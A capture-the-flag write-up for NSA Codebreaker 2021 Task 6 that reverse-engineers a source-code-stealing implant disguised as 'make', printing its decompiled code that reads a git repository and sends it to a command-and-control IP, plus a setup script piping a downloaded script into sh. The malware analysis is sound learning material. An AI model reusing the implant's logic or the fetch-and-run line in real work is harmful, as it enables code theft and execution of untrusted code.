---
layout: page
title: NSA-Codebreaker-2021 Task 6
permalink: /NSA-Codebreaker-2021/task6
---


### Initial look

Now that we know where the malware is we need to understand what it is doing. We can see that we need the IP, port, and pub key of the malware so this let's us deduce several things. First and foremost, this piece of malware is communicating to a remote server. This is very normal when malware is part of a bot net (unlikely due to the scenario) or an implant for an APT style attack communicating to a command and control server (C2) which is more likely in this case.

We also already know that this is not a stripped binary which will make it easier to reverse engineer which is very nice.

Taking a closer look at the file we see that it is:
```
$file make
make: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, with debug_info, not stripped
```

It is incredibly nice that debugging information was included as well as that will help work with this.

The first step for me of analyzing a binary is always running the strings command on it. This prints out all ASCII characters in the binary and can give you an idea of what the binary does based on the function names and imports.

However, a there's a god awful number of strings in the binary file so it is impossible to look at all of them. (A total of `$strings make | wc -l 35855`). The imported functions are normally at the top of the strings in a binary file so I looked at with `strings make | less`. This didn't give me too much interesting information. I did find several git function imported and socket imported:

```
...
memcmp
socket
memchr
pthread_mutex_unlock
strcmp
ntohl
__deregister_frame_info
git_diff_commit_as_email
git_revwalk_free
git_repository_open_ext
git_libgit2_init
git_revwalk_push_head
git_oid_tostr_s
git_revwalk_new
git_commit_author
git_commit_free
git_revwalk_sorting
git_repository_open
git_commit_summary
git_commit_lookup
git_libgit2_shutdown
git_revwalk_next
git_buf_dispose
git_repository_free
...
```

From this I can guess that something is being done with the GitHub repo and my suspicion that the malware reaches out to a remote server is supported. From the previous challenge description we know that this company has had problems with their source code being stolen before and all of these clues point to that.

### Static Analysis with Ghidra

At this point, I moved into more advanced static analysis of the binary using Ghidra because that seemed fitting due to the fact this is an NSA challenge. However tools like IDA, radare2, or binary ninja all would have worked as well. 

As always, when analyzing a program let's start at main if we know where that is. It's a pretty short setup so I can included it all here:

```C
int main(int argc, char **argv)

{
  int iVar1;
  char *pcVar2;
  
  gitGrabber();
  pcVar2 = tgexpgbgxulli(0xe);
  *argv = pcVar2;
  iVar1 = execvp(*argv,argv);
  return iVar1;
}
```

We see that this main function calls a function called gitGrabber, then gets some arguments from tgexpgbgxulli that then calls some other program using execvp. This gives us 2 directions to work in. We can either explore the tgexpgbgxulli function or the gitGrabber. While I did originally look at tgexpgbgxulli, when working on this project it is hard to understand without looking at gitGrabber. (I'll also note that gitGrabber is human readable which may be a nudge by the competition creators that we should look there first. A nudge I missed at first, but see now with hindsight.)

Opening gitGrabber we see a more substantial function:
```C
void gitGrabber(void)

{
  long lVar1;
  bool bVar2;
  int __fd;
  int iVar3;
  char *pcVar4;
  char *ip_00;
  size_t length;
  long in_FS_OFFSET;
  int successful;
  int lockfd;
  int rv;
  char *output;
  char *ip;
  char *lockfile;
  string tmp;
  basic_string local_1c8 [32];
  stringstream ss;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  bVar2 = false;
  std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::
  basic_stringstream();
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();
                    /* try { // try from 0010a283 to 0010a3e5 has its CatchHandler @ 0010a416 */
  git_libgit2_init();
  __fd = qyvqmmhtjmlie();
  if (((__fd != -1) && (iVar3 = ndldgaiugwdhv(), iVar3 == 0)) &&
     (iVar3 = dxfivqvkpuunm(&ss), iVar3 == 0)) {
    std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::str();
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=
              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&tmp,local_1c8);
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_1c8);
    pcVar4 = (char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::
                     c_str();
    ip_00 = tgexpgbgxulli(0x13);
    length = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
    iVar3 = kvhlfowzlznog(ip_00,0x1a0a,pcVar4,length);
    aotxxfxjjvuoy(0x13);
    if (iVar3 == 0) {
      bVar2 = true;
    }
  }
  git_libgit2_shutdown();
  if ((__fd != -1) && (close(__fd), !bVar2)) {
    pcVar4 = tgexpgbgxulli(6);
    unlink(pcVar4);
    aotxxfxjjvuoy(6);
  }
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&tmp);
  std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::
  ~basic_stringstream((basic_stringstream<char,std::char_traits<char>,std::allocator<char>> *)&ss);
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Looking through this we can get a pretty general idea of what is happening based on the variable names (which we will assume are not misleading, but who knows).

In these lines
```C
  git_libgit2_init();
  __fd = qyvqmmhtjmlie();
  if (((__fd != -1) && (iVar3 = ndldgaiugwdhv(), iVar3 == 0)) &&
     (iVar3 = dxfivqvkpuunm(&ss), iVar3 == 0))
```

It seems as if some sort of file descriptor is opened and then several checks happen, if any of these checks fail then the program exits out early. This means we probably want these checks to succeed.

Opening the qyvqmmhtjmlie function we see that it does the following

```C
  int iVar1;
  char *__file;
  int fd;
  char *lockfile;
  __file = tgexpgbgxulli(6);
  iVar1 = open(__file,0xc1,0x1a4);
  aotxxfxjjvuoy(6);
  return iVar1;
```

and ndldgaiugwdhv does:
```C
int iVar1;
  char *pcVar2;
  int result;
  int rv;
  char *gitpath;
  char *pidof_git;
  
  pcVar2 = tgexpgbgxulli(7);
  iVar1 = git_repository_open_ext(0,pcVar2,1,0);
  aotxxfxjjvuoy(7);
  if (iVar1 == 0) {
    pcVar2 = tgexpgbgxulli(8);
    iVar1 = system(pcVar2);
    aotxxfxjjvuoy(8);
    if (iVar1 == 0) {
      iVar1 = -1;
    }
    else {
      iVar1 = 0;
    }
  }
  else {
    iVar1 = -1;
  }
  return iVar1;
```

Also looking through dxfivqvkpuunm (which was way too long to include and is in a separate file in this directory)

We can guess by the number of references to git that this is where the git repo is looked at before being stolen. It also makes sense that if there is no git repo on the system, then it can't do anything and simply returns.

Looking farther down in the program we see the following lines of code:

```C
    ip_00 = tgexpgbgxulli(0x13);
    length = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
    iVar3 = kvhlfowzlznog(ip_00,0x1a0a,pcVar4,length);
    aotxxfxjjvuoy(0x13);
```
and after this section of code, the program seems to end, so we can assume that this is where the meat of the operation happens.

However, before we go farther it seems that we have found where 2 of the flags are. In order to use a socket (which we know from before this code does) you need to have an IP address and a port number. We directly see an variable labeled IP here and next to it an hard coded integer. At this point, I opened the program in GDB with GEF installed and simply called tgexpgbgxulli(0x13) which gave me the ip address and converted the hex port to an integer. (I will go into detail later in the walk through how to open and run stuff in GDB.) Both of these flags were correct letting me know that I was on the correct path.

Now lets take a look at the monstrosity that is kvhlfowzlznog. Since it has over 200 lines (many longer then a single line) I won't paste it here, but the full decompiled code is also in the git repo. 

Let's first look at a reduced first chunk:
```C
int kvhlfowzlznog(char *ip,uint16_t port,char *output,size_t length)
{
  ...
  ...
  yridlcsrsfalm(&my_uuid,0x10);
  ...
  ...
  username = getlogin();
  if (username == (char *)0x0) {
    username = tgexpgbgxulli(5);
  }
  version_00 = tgexpgbgxulli(0x11);
  uname((utsname *)&ubuf);
  gettimeofday((timeval *)&tv,(__timezone_ptr_t)0x0);
  fingerprint(&fp,username,version_00,ubuf.sysname,tv.tv_sec);
                    /* try { // try from 0015a6ea to 0015a6ee has its CatchHandler @ 0015ac64 */
  fpToK(&session_key,username,version_00,tv.tv_sec);
                    /* try { // try from 0015a6f4 to 0015a746 has its CatchHandler @ 0015ac50 */
  aotxxfxjjvuoy(0x11);
  aotxxfxjjvuoy(5);
  sock_00 = biuuwoagwpgxf(ip,port);
  if (-1 < sock_00) {
  ...
  ...
```

At this point if we hadn't guessed what the port was the 2nd argument passed to the function we could definitely do that now. We also have seen the tgex function called enough times that we are able to guess what it's purpose is simply from a black box perspective. It seems to be hiding the configuration strings needed for this program. This makes sense because anti virus software can be given certain strings (like a known bad IP) that cause it to block a program from running. Rather then simply hard code those values in, they are encrypted (or encoded since the key is also in the code) to prevent easy detection.

### Dynamic Analysis

Now, let's look at how to do some dynamic analysis of this binary. The first thing to try is to simply run binary on my machine (Note: this is a bad idea when actually analyzing malware as it could do real damage to your system. Always use a virtual machine or isolated machine.) This did not work easily as it requires some non standard libraries. While the error doesn't say what libraries is needed, after a bunch of work it seems to be the NaCL cryptography libraries. Simply installing the library did not work well so I decided to simply use the given docker image.

To make sure everything runs properly, edit the files in the tar directory to download a git repo that actually exists, I used a random one I control, and then repack everything into a valid docker tar image.

Next load the tar image into docker. (For me it was loaded under 48cf127d0fad.) and then run it with the remote host IP assigned to it and the local folder shared to the root home to allow persistent files.

```bash
#!/bin/bash

sudo mkdir /sys/fs/cgroup/systemd
sudo mount -t cgroup -o none,name=systemd cgroup /sys/fs/cgroup/systemd

docker run --net mynet123 --ip 198.51.100.209 -v ${PWD}:/root -it 48cf127d0fad bash --init-file /root/setup
```
This starts up the image and then runs the setup script which allows easy additions to the machine as you work with it.

My script is:
```bash
#/bin/sh
apk add curl
apk add gdb

#install GEF
wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh

#remove lock file created by the malware - needed if you constantly restart the program
while  :; do rm /tmp/.gglock >out 2>&1; sleep 10; done &

apk add vim
apk add tmux
apk add strace
git clone https://github.com/hourglass492/tmp.git  /usr/local/src/repo
apk add file
cd ~
```

Once all of these start it is possible to call functions within gdb.

Simply start gdb with make as the target:
```bash
gdb make
```

Then set a breakpoint on main and call the function with the variables you want:

```
gef➤  p (char *) tgexpgbgxulli(5)
$1 = 0x7f3e79f7c954 "unknown"
gef➤  p (char *) tgexpgbgxulli(0x13)
$2 = 0x7f3e79f7c9b4 "198.51.100.209"
gef➤  p (char *) tgexpgbgxulli(0x11)
$3 = 0x7f3e79f7ca14 "2.0.2.0-UQT"
gef➤  p (char *) tgexpgbgxulli(0x12)
$4 = 0x7f3e79f7ca74 "3\\\201\244]E\231\361\\XD\254\063\251y\237\302\221\033\310\370\314=\357^\352M\264\020izs"
```
The previous is the username, IP, version number, and the public key. The variable for the public key was found in the ozzumyndvjsex function (also included in the repo) from line 32:

```C
pubKey = tgexpgbgxulli(0x12);
```

And at this point all of the team challenges are done.
